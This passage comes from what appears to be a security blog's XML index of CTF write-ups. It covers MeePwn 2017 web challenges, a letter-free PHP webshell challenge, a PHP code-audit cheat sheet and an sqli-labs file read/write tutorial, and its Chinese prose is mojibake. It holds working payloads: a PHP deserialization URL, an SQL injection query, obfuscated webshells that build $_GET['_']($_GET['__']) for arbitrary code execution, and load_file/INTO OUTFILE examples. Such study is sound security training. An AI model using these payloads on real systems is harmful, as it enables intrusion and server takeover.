(i = 1; i &lt;= n; i++)&#123; scanf("%lf%lf",&amp;valuesor[i].weight,&amp;valuesor[i].value); valuesor[i].unitValue = (double)valuesor[i].value / (double)valuesor[i].weight; valuesor[i].id = i; &#125; quick_sort(valuesor,1,n); double remainSpace = m; double allValue = 0; i = 1; for (i = 1; i &lt;= n ; i++)&#123; if (remainSpace &lt;= 0) break; if (valuesor[i].weight &lt;= remainSpace)&#123; remainSpace = remainSpace - valuesor[i].weight; allValue += valuesor[i].value; &#125;else&#123; allValue += remainSpace *valuesor[i].unitValue; remainSpace = 0; &#125; &#125; printf("%lf\n",allValue); return 0;&#125;void quick_sort(unit s[], int l, int r)&#123; if (l &lt; r) &#123; int i = l, j = r; unit x = s[l]; while (i &lt; j) &#123; while(i &lt; j &amp;&amp; s[j].unitValue &lt;= x.unitValue) j--; if(i &lt; j)&#123; s[i].unitValue = s[j].unitValue; s[i].id = s[j].id; s[i].value = s[j].value; s[i].weight = s[j].weight; i++; &#125; while(i &lt; j &amp;&amp; s[i].unitValue &gt;= x.unitValue) i++; if(i &lt; j)&#123; s[j].unitValue = s[i].unitValue; s[j].id = s[i].id; s[j].value = s[i].value; s[j].weight = s[i].weight; j--; &#125; &#125; s[i].id = x.id; s[i].unitValue = x.unitValue; s[i].value = x.value; s[i].weight = x.weight; quick_sort(s, l, i - 1); quick_sort(s, i + 1, r); &#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Meenpwn-2017-web-writeup]]></title>
      <url>%2F2017%2F07%2F16%2FMeenpwn-2017-web-writeup%2F</url>
      <content type="text"><![CDATA[è€ƒç‚¹ï¼šååºåˆ—åŒ–ï¼Œrandï¼Œsqlæ³¨å…¥ TSULOTTé€šè¿‡æŸ¥çœ‹æºä»£ç ï¼Œå¯ä»¥å‘çŽ°hintï¼Œå¾—åˆ°æºç ï¼Œè¿™é‡Œåªè´´é‡ç‚¹éƒ¨åˆ†ã€‚12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;body&gt;&lt;?phpclass Object&#123; var $jackpot; var $enter;&#125;?&gt;&lt;?phpinclude('secret.php');if(isset($_GET['input'])) &#123; $obj = unserialize(base64_decode($_GET['input'])); if($obj) &#123; $obj-&gt;jackpot = rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99); if($obj-&gt;enter === $obj-&gt;jackpot) &#123; echo "&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;CONGRATULATION! You Won JACKPOT PriZe !!! &lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;". "&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white' size='20'&gt;".$obj-&gt;jackpot."&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"; echo "&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='green' size='25'&gt;".$flag."&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;&lt;br&gt;"; echo "&lt;center&gt;&lt;img src='http://www.relatably.com/m/img/cross-memes/5378589.jpg' /&gt;&lt;/center&gt;"; &#125; else &#123; echo "&lt;br&gt;&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;Wrong! True Six Numbers Are: &lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;". "&lt;br&gt;&lt;center&gt;&lt;strong&gt;&lt;font color='white' size='25'&gt;".$obj-&gt;jackpot."&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;&lt;br&gt;"; &#125; &#125; else &#123; echo "&lt;center&gt;&lt;strong&gt;&lt;font color='white'&gt;- Something wrong, do not hack us please! -&lt;/font&gt;&lt;/strong&gt;&lt;/center&gt;"; &#125;&#125;else&#123; echo "";&#125;?&gt;&lt;center&gt;&lt;br&gt;&lt;h2&gt;&lt;font color='yellow' size=8&gt;-- TSU&lt;/font&gt;&lt;font color='red' size=8&gt;LOTT --&lt;/font&gt;&lt;/h2&gt;&lt;p&gt;&lt;p&gt;&lt;font color='white'&gt;Input your code to win jackpot!&lt;/font&gt;&lt;p&gt;&lt;form&gt; &lt;input type="text" name="input" /&gt;&lt;p&gt;&lt;p&gt; &lt;button type="submit" name="btn-submit" value="go"&gt;send&lt;/button&gt;&lt;/form&gt;&lt;/center&gt;&lt;?phpif (isset($_GET['gen_code']) &amp;&amp; !empty($_GET['gen_code']))&#123; $temp = new Object; $temp-&gt;enter=$_GET['gen_code']; $code=base64_encode(serialize($temp)); echo '&lt;center&gt;&lt;font color=\'white\'&gt;Here is your code, please use it to Lott: &lt;strong&gt;'.$code.'&lt;/strong&gt;&lt;/font&gt;&lt;/center&gt;';&#125;?&gt;&lt;center&gt;&lt;font color='white'&gt;-----------------------------------------------------------------------------------------------------------------------------&lt;/font&gt;&lt;h3&gt;&lt;font color='white'&gt;Take code&lt;/font&gt;&lt;/h3&gt;&lt;p&gt;&lt;p&gt;&lt;font color='white'&gt;Pick your six numbers (Ex: 15 02 94 11 88 76)&lt;/font&gt;&lt;p&gt;&lt;form&gt; &lt;input type="text" name="gen_code" maxlength="17" /&gt;&lt;p&gt;&lt;p&gt; &lt;button type="submit" name="btn-submit" value="go"&gt;send&lt;/button&gt;&lt;/form&gt;&lt;/center&gt;&lt;?phpif(isset($_GET['is_debug']) &amp;&amp; $_GET['is_debug']==='1')&#123; show_source(__FILE__);&#125;?&gt;&lt;!-- GET is_debug=1 --&gt;&lt;/body&gt; çœ‹åˆ°æœ‰unserializeï¼Œæ„Ÿè§‰ä¼šè€ƒååºåˆ—åŒ–é—®é¢˜ã€‚çœ‹åˆ°æœ‰rand()æ„Ÿè§‰ä¼šè€ƒéšæœºæ•°é¢„æµ‹é—®é¢˜ã€‚çœ‹åˆ°===ï¼Œä¸€èˆ¬ä¸å­˜åœ¨å¼±ç±»åž‹é—®é¢˜ã€‚ä»Žæºç ä¸Šçœ‹ï¼Œè¿™é¢˜éœ€è¦æˆ‘ä»¬é¢„æµ‹ç•™ä¸ªæ•°å­—ï¼Œç„¶åŽåºåˆ—åŒ–å†ä¼ å…¥å¹¶ååºåˆ—åŒ–ï¼Œä¸ŽæœåŠ¡å™¨ä¸Šéšæœºç”Ÿæˆçš„å…­ä¸ªæ•°è¿›è¡Œå¯¹æ¯”ï¼Œè‹¥ç›¸åŒåˆ™å‡ºflagã€‚è¿™é¢˜æœ€åŽç”¨ååºåˆ—åŒ–çš„æ–¹æ³•è§£å‡ºæ¥äº†ã€‚ä¸è¿‡è¿™ä¸ªååºåˆ—åŒ–çš„å¥—è·¯è·Ÿä»¥å‰ä¸å¤ªä¸€æ ·ã€‚åˆ©ç”¨ä¸‹é¢çš„phpä»£ç ï¼š1234567891011&lt;?phpclass Object&#123; var $jackpot; var $enter;&#125;$chybeta = new Object();$chybeta-&gt;enter=&amp;$obj-&gt;jackpot;$code=base64_encode(serialize($chybeta));echo $code; ä¸Šè¿°ä»£ç ï¼Œå°†$jackpotçš„åœ°å€èµ‹ç»™$enterï¼Œç›¸å½“äºŽä¸¤ä¸ªæŒ‡é’ˆæŒ‡åˆ°äº†åŒä¸€å—å†…å­˜åŒºåŸŸï¼Œæ‰€ä»¥ä¸ç®¡åšä»€ä¹ˆå˜åŒ–ï¼Œè¿™ä¸¤ä¸ªå˜é‡çš„å˜åŒ–æ˜¯åŒæ­¥çš„ã€‚ è®¿é—®ï¼š1http://128.199.190.23:8001/?input=Tzo2OiJPYmplY3QiOjI6e3M6NzoiamFja3BvdCI7TjtzOjU6ImVudGVyIjtSOjI7fQ%3D%3D&amp;btn-submit=go FLAG:1MeePwnCTF&#123;__OMG!!!__Y0u_Are_Milli0naire_N0ww!!___&#125; è¿™ä¸ªæ€è·¯å½“æ—¶æˆ‘æƒ³åˆ°äº†ä½†æ²¡åŽ»å°è¯•ï¼Œå› ä¸ºå½“æ—¶æƒ³çš„æ˜¯ä¼ ç»™enterçš„jackpotåœ°å€æ˜¯æˆ‘æœ¬æœºä¸Šçš„åœ°å€ï¼Œè·ŸæœåŠ¡å™¨ä¸Šçš„ä¸åŒï¼Œç„¶åŽå°±æ­»ç£•åœ¨randï¼ˆï¼‰çš„é¢„æµ‹ä¸Šã€‚åœ¨è·Ÿä¸€èˆªå¤§ä½¬è®¨è®ºåŽï¼Œæ‰çŸ¥é“è¿™ä¸ªå§¿åŠ¿å¯è¡Œã€‚æ°¸è¿œä¸è¦æ€€ç–‘è‡ªå·±çš„è„‘æ´žã€‚å…³äºŽphpå˜é‡çš„å†…å­˜åˆ†å¸ƒä¹‹åŽå•ç‹¬å¼€ä¸€ç¯‡å†™ã€‚ è¿˜æœ‰å°±æ˜¯å¯¹randï¼ˆï¼‰çš„é¢„æµ‹ã€‚è¿™ä¸ªæƒ³æ³•ä¸æ˜¯ä¸æ— æ ¹æ®ï¼ŒHITCON CTF 2015 Quals Web Giraffeâ€™s Coffeeå’Œ0CTF 2016 qual rand2éƒ½è€ƒåˆ°è¿‡ã€‚phå¸ˆå‚…çš„å®‰å…¨ç®±å­çš„ç§˜å¯†å’ŒSjoerd Langkemperçš„Cracking PHP rand()æœ‰è°ˆåˆ°è¿™ä¸ªrand()é¢„æµ‹çš„å…·ä½“æŠ€å·§å’Œæ“ä½œã€‚ä¸è¿‡æˆ‘æ²¡æˆåŠŸ:) Br0kenMySQL123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;title&gt;Br0kenMySQL&lt;/title&gt;&lt;h1&gt;&lt;pre&gt;&lt;p style='color:Red'&gt;Br0kenMySQL&lt;/p&gt;&lt;?phpif($_GET['debug']=='ðŸ•µ') die(highlight_file(__FILE__));require 'config.php';$link = mysqli_connect('localhost', MYSQL_USER, MYSQL_PASSWORD);if (!$link) &#123; die('Could not connect: ' . mysql_error());&#125;if (!mysqli_select_db($link,MYSQL_USER)) &#123; die('Could not select database: ' . mysql_error());&#125; $id = $_GET['id']; if(preg_match('#sleep|benchmark|floor|rand|count#is',$id)) die('Don\'t hurt me :-('); $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id); $row = mysqli_fetch_array($query); $username = $row['username']; if($username === 'guest')&#123; $ip = @$_SERVER['HTTP_X_FORWARDED_FOR']!="" ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']; if(preg_match('#sleep|benchmark|floor|rand|count#is',$ip)) die('Don\'t hurt me :-('); var_dump($ip); if(!empty($ip)) mysqli_query($link,"INSERT INTO logs VALUES('&#123;$ip&#125;')"); $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id); $row = mysqli_fetch_array($query); $username = $row['username']; if($username === 'admin')&#123; echo "What ???????\nLogin as guest&amp;admin at the same time ?\nSeems our code is broken, here is your bounty\n"; die(FLAG); &#125; echo "Nothing here"; &#125; else &#123; echo "Hello ".$username; &#125;?&gt;&lt;/h1&gt;&lt;/pre&gt; ä»Žæºç æ¥çœ‹ï¼Œé€»è¾‘ä¸Šæˆ‘ä»¬å¾—å…ˆè®©$usernameå€¼ä¸ºguestè¿›å…¥ifåˆ¤æ–­åŽï¼Œå†è®©$usernameçš„å€¼ä¸ºadminï¼Œä»Žè€Œechoå‡ºflagã€‚è€Œä¸”$idå¤„å¯æ³¨å…¥ã€‚åšæ³•æ˜¯æ‰¾åˆ°ä¸€ä¸ªéšæœºä¸²ï¼Œåˆ©ç”¨caseè¯­å¥åœ¨ä¸åŒæƒ…å†µä¸‹éšæœºå–å€¼ï¼Œç»“åˆçˆ†ç ´ï¼Œæ‹¿flagã€‚é¢˜ç›®æŠŠrand()ï¼Œfloor()ç­‰è¿‡æ»¤äº†ï¼Œä¸èƒ½ç›´æŽ¥ç”Ÿæˆéšæœºæ•°ã€‚å¯ä»¥åˆ©ç”¨mysqlå†…ç½®çš„ä¸€äº›å‡½æ•°æˆ–å˜é‡ï¼Œæ¯”å¦‚æ—¶é—´æˆ³ã€‚å› æ­¤æœ‰äº†ä¸‹é¢çš„payloadï¼š1http://139.59.239.133/?id=(SELECT case MOD(UNIX_TIMESTAMP(),3) when 1 then 2 else 1 end;) FLAG:1MeePwnCTF&#123;_b4by_tr1ck_fixed&#125; é™¤äº†ç”¨UNIX_TIMESTAMP()ï¼Œå…¶ä»–ä¸€äº›å‡½æ•°/å˜é‡ä¹Ÿè¡Œï¼Œæ¯”å¦‚ï¼š123456789101112uuid()UUID_SHORT() // mysql 5.1åŽæœ‰CURRENT_TIMESTAMP()CURRENT_TIMESTAMPCURTIME()localtime()localtimelocaltimestamp()localtimestampnow()sysdate()utc_timestamp() Br0kenMySQL v2Br0kenMySQL v3]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[è°ˆä¸€è°ˆphpå˜é‡çš„å†…å­˜åˆ†å¸ƒ]]></title>
      <url>%2F2017%2F07%2F16%2F%E8%B0%88%E4%B8%80%E8%B0%88php%E5%8F%98%E9%87%8F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83%2F</url>
      <content type="text"></content>
    </entry>

    
    <entry>
      <title><![CDATA[ä¸€é“å¥½çŽ©çš„webshellé¢˜]]></title>
      <url>%2F2017%2F07%2F15%2F%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98%2F</url>
      <content type="text"><![CDATA[è¿‡æ»¤äº†æ•°å­—å’Œç»å¤§å¤šæ•°å­—ç¬¦ã€‚é¢˜ç›®ç»™äº†æºç ï¼š123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpini_set("display_errors", "On");error_reporting(E_ALL | E_STRICT);if(!isset($_GET['c']))&#123; show_source(__FILE__); die();&#125;function rand_string( $length ) &#123; $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; $size = strlen( $chars ); $str = ''; for( $i = 0; $i &lt; $length; $id+ ) &#123; $str .= $chars[ rand( 0, $size - 1 ) ]; &#125; return $str;&#125;$data = $_GET['c'];$black_list = array(' ', '!', '"', '#', '%', '&amp;', '*', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '&lt;', '&gt;', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\\', '^', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '|', '~');foreach ($black_list as $b) &#123; if (stripos($data, $b) !== false)&#123; die("WAF!"); &#125;&#125;$filename=rand_string(0x20).'.php';$folder='uploads/';$full_filename = $folder.$filename;if(file_put_contents($full_filename, '&lt;?php '.$data))&#123; echo "&lt;a href='".$full_filename."'&gt;WebShell&lt;/a&gt;&lt;/br&gt;"; echo "Enjoy your webshell~";&#125;else&#123; echo "Some thing wrong...";&#125; å­—æ¯å•¥çš„éƒ½è¿‡ç•¥äº†ã€‚å‚è€ƒpç¥žçš„ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshellã€‚å…¶æ€è·¯å°±æ˜¯åˆ©ç”¨å­—ç¬¦ä¸²ARRAYèŽ·å–å­—ç¬¦Aï¼Œåˆ©ç”¨phpçš„ç‰¹æ€§ï¼Œä»ŽAé€’å¢žèŽ·å¾—Aåˆ°Zçš„å„ä¸ªå­—æ¯ã€‚åŽŸwebshellå­˜åœ¨&quot;ä¿®æ”¹å…¶webshellï¼Œå¦‚ä¸‹ï¼š1234567891011121314151617181920212223242526272829303132333435&lt;?php$_='';$_[+$_]++;$_=$_.'';$__=$_[+''];$_ = $__;$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]); ç”±äºŽ+åœ¨ä¼ é€ä¸­ä¼šè¢«è§£é‡Šä¸ºç©ºæ ¼ï¼Œæ‰€ä»¥éœ€è¦æå‰urlç¼–ç ä¸º%2b,ç„¶åŽè¿˜éœ€è¦åŽ»æŽ‰ä¸Šé¢çš„è¿™ä¸ªwebshellä¸­çš„ç©ºæ ¼ï¼Œæ¢è¡Œã€‚æœ€åŽçš„payloadå¦‚ä¸‹ï¼š1http://120.24.215.80:10010/?c=$_=&apos;&apos;;$_[%2b$_]%2b%2b;$_=$_.&apos;&apos;;$__=$_[%2b&apos;&apos;];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&apos;_&apos;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]); è¿™é‡Œå¦å¤–è¡¥å……ä¸€ä¸ªwebshellï¼Œè§£æ³•æ¥è‡ªhttp://www.jianshu.com/p/d23d4b1358f2ï¼š1234567891011121314151617181920212223242526&lt;?php$_=[].[];$__='';$_=$_[''];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_; // E$_=++$_;$_=++$_;$__=$_.$__; // GE$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_; // GET var_dump($&#123;'_'.$__&#125;[_]($&#123;'_'.$__&#125;[__])); // $_GET["_"]($_GET["__"]); å…¶æœ€åŽçš„payloadä¸ºï¼š1http://120.24.215.80:10010/?c=%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[phpä»£ç å®¡è®¡å°æ€»ç»“]]></title>
      <url>%2F2017%2F07%2F14%2Fphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93%2F</url>
      <content type="text"><![CDATA[phpä»£ç å®¡è®¡å°æ€»ç»“ å‘½ä»¤æ‰§è¡Œphpä»£ç æ‰§è¡Œ eval() assert() preg_replace + â€˜/eâ€™ call_user_func() call_user_func_arra() create_function array_map() ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ system() passthru() exec() pcntl_exec() shell_exec() popen() proc_open() `(åå•å¼•å·) ob_start() escapeshellcmd() // è¯¥å‡½æ•°ç”¨äºŽè¿‡æ»¤ æ–‡ä»¶ä¸Šä¼  move_uploaded_file() getimagesize() //éªŒè¯æ–‡ä»¶å¤´åªè¦ä¸ºGIF89aï¼Œå°±ä¼šè¿”å›žçœŸ æ–‡ä»¶åˆ é™¤ unlink() session_destroy() æ–‡ä»¶åŒ…å«æœ¬åœ°æ–‡ä»¶åŒ…å« require() include() include_once() require_once() è¿œç¨‹æ–‡ä»¶åŒ…å« allow_url_include = on æ–‡ä»¶è¯»å–è¯»æ–‡ä»¶ hightlight_file($filename); show_source($filename); print_r(php_strip_whitespace($filename)); print_r(file_get_contents($filename)); readfile($filename); print_r(file($filename)); // var_dump fread(fopen($filename,â€râ€), $size); include($filename); // éžphpä»£ç  include_once($filename); // éžphpä»£ç  require($filename); // éžphpä»£ç  require_once($filename); // éžphpä»£ç  print_r(fread(popen(â€œcat flagâ€, â€œrâ€), $size)); print_r(fgets(fopen($filename, â€œrâ€))); // è¯»å–ä¸€è¡Œ fpassthru(fopen($filename, â€œrâ€)); // ä»Žå½“å‰ä½ç½®ä¸€ç›´è¯»å–åˆ° EOF print_r(fgetcsv(fopen($filename,â€râ€), $size)); print_r(fgetss(fopen($filename, â€œrâ€))); // ä»Žæ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–ä¸€è¡Œå¹¶è¿‡æ»¤æŽ‰ HTML æ ‡è®° print_r(fscanf(fopen(â€œflagâ€, â€œrâ€),â€%sâ€)); print_r(parse_ini_file($filename)); // å¤±è´¥æ—¶è¿”å›ž false , æˆåŠŸè¿”å›žé…ç½®æ•°ç»„ åˆ—ç›®å½• print_r(glob(â€œ*â€)); // åˆ—å½“å‰ç›®å½• print_r(glob(â€œ/*â€)); // åˆ—æ ¹ç›®å½• print_r(scandir(â€œ.â€)); print_r(scandir(â€œ/â€œ)); $d=opendir(&quot;.&quot;);while(false!==($f=readdir($d))){echo&quot;$f\n&quot;;} $d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read())){echo$f.&quot;\n&quot;;} è¶…å…¨å±€å˜é‡ $GLOBALS å˜é‡è¦†ç›– extract() import_request_variables() parse_str() mb_parse_str() å…¨å±€å˜é‡è¦†ç›–ï¼šregister_globalsä¸ºONï¼Œ$GLOBALS phpåºåˆ—åŒ–å‡½æ•° serialize() unserialize() ini_set(â€˜session.serialize_handlerâ€™, â€˜php_serializeâ€™); Reference ä»£ç å®¡è®¡å…¥é—¨æ€»ç»“ phpèŠ±å¼è¯»å–æ–‡ä»¶å‡½æ•°æ±‡æ€» Awesome-CTF-Book]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sqli-Labs:Less7-writeup]]></title>
      <url>%2F2017%2F07%2F12%2FSqli-Labs-Less7-writeup%2F</url>
      <content type="text"><![CDATA[Sqli-Labsæ˜¯ç”¨æ¥ç»ƒä¹ sqlæ³¨å…¥çš„å¥½å¹³å°ã€‚projectåœ°å€ï¼šhttps://github.com/Audi-1/sqli-labsæœ¬æ–‡æµ‹è¯•çŽ¯å¢ƒï¼šä½¿ç”¨phpstudyé›†æˆçŽ¯å¢ƒã€‚mysqlç‰ˆæœ¬ï¼š5.5.53 Less7 æ˜¯ dump out file åŸºç¡€çŸ¥è¯†åˆ©ç”¨sqlæ³¨å…¥å¯ä»¥å¯¼å…¥å¯¼å‡ºæ–‡ä»¶ï¼ŒèŽ·å–æ–‡ä»¶å†…å®¹ï¼Œæˆ–å‘æ–‡ä»¶å†™å…¥å†…å®¹ã€‚ load_file()ç”¨äºŽè¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹ã€‚æœ‰å‡ ä¸ªæ¡ä»¶é™åˆ¶ï¼š éœ€è¦æœ‰è¯»å–æ–‡ä»¶çš„æƒé™ éœ€è¦çŸ¥é“æ–‡ä»¶çš„ç»å¯¹ç‰©ç†è·¯å¾„ã€‚ å‡è®¾Cç›˜é‡Œæœ‰ä¸€ä¸ªTEST.txtæ–‡ä»¶ï¼Œå†…å®¹ä¸ºchybetaã€‚å‡ ç§è¯»å–æ–¹å¼å¦‚ä¸‹ï¼š ç›´æŽ¥ä½¿ç”¨ç»å¯¹è·¯å¾„æ³¨æ„å¯¹è·¯å¾„ä¸­æ–œæ çš„å¤„ç†ã€‚ mysql&gt; select load_file(â€œC://TEST.txtâ€); mysql&gt; select load_file(â€œC:/TEST.txtâ€); mysql&gt; select load_file(â€œC:\TEST.txtâ€); ä»¥ä¸Šè¿”å›žç»“æžœå¦‚ä¸‹ï¼š123456+---------------------------+| load_file(&quot;C://TEST.txt&quot;) |+---------------------------+| chybeta |+---------------------------+1 row in set (0.00 sec) ä½†è‹¥è¾“å…¥ä»¥ä¸‹æŸ¥è¯¢åˆ™ä¼šè¿”å›žç©ºå³ä¸æˆåŠŸã€‚ mysql&gt; select load_file(â€œC:\TEST.txtâ€);123456+--------------------------+| load_file(&quot;C:\TEST.txt&quot;) |+--------------------------+| NULL |+--------------------------+1 row in set (0.00 sec) ä½¿ç”¨ç¼–ç ASCIIä»¥C:\\TEST.txtä¸ºä¾‹ã€‚å¯¹å…¶è¿›è¡Œasciiç¼–ç åŽåˆ©ç”¨charï¼ˆï¼‰è¿›è¡ŒæŸ¥è¯¢ï¼š1mysql&gt; select load_file(char(67,58,92,92,84,69,83,84,46,116,120,116)); è¿”å›žç»“æžœï¼š123456+---------------------------------------------------------+| load_file(char(67,58,92,92,84,69,83,84,46,116,120,116)) |+---------------------------------------------------------+| chybeta |+---------------------------------------------------------+1 row in set (0.02 sec) åå…­è¿›åˆ¶ä»¥C:\\TEST.txtä¸ºä¾‹ã€‚å¯¹å…¶è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç åŽè¿›è¡ŒæŸ¥è¯¢ï¼š1mysql&gt; select load_file(0x433a5c5c544553542e747874); è¿”å›žç»“æžœï¼š123456+---------------------------------------+| load_file(0x433a5c5c544553542e747874) |+---------------------------------------+| chybeta |+---------------------------------------+1 row in set (0.00 sec) selectå¯ä»¥ç”¨æ¥å¯¼å‡ºæ–‡ä»¶/æ•°æ®åˆ°æ–‡ä»¶ä¸­ã€‚è¯­æ³•å¦‚ä¸‹ï¼š1SELECT * INTO OUTFILE &apos;file_name&apos; æˆ–è€…1SELECT * INTO DUMPFILE &apos;file_name&apos; file_nameå¤„ä¸€èˆ¬è¦æŒ‡å®šç»å¯¹è·¯å¾„ï¼Œå¦åˆ™å°±ä¼šå¯¼å‡ºåˆ°mysqlçš„ç›®å½•ä¸‹ã€‚åŒæ—¶å¯¹éœ€å¯¼å‡ºçš„ç›®å½•æœ‰å¯å†™æƒé™ã€‚å¯¹file_nameï¼Œå¯ä»¥æœ‰ä»¥ä¸‹å‡ ç§ç¼–ç æ–¹å¼ï¼Œæ³¨æ„å¯¹è·¯å¾„åˆ†éš”ç¬¦çš„å¤„ç†ï¼š æ•°æ®å¯¼å‡º12mysql&gt; select database() into outfile &apos;C:\\phpstudy\\WWW\\test\\1&apos;;Query OK, 1 row affected (0.09 sec) 12mysql&gt; select database() into outfile &apos;C:/phpstudy/WWW/test/1&apos;;Query OK, 1 row affected (0.00 sec) 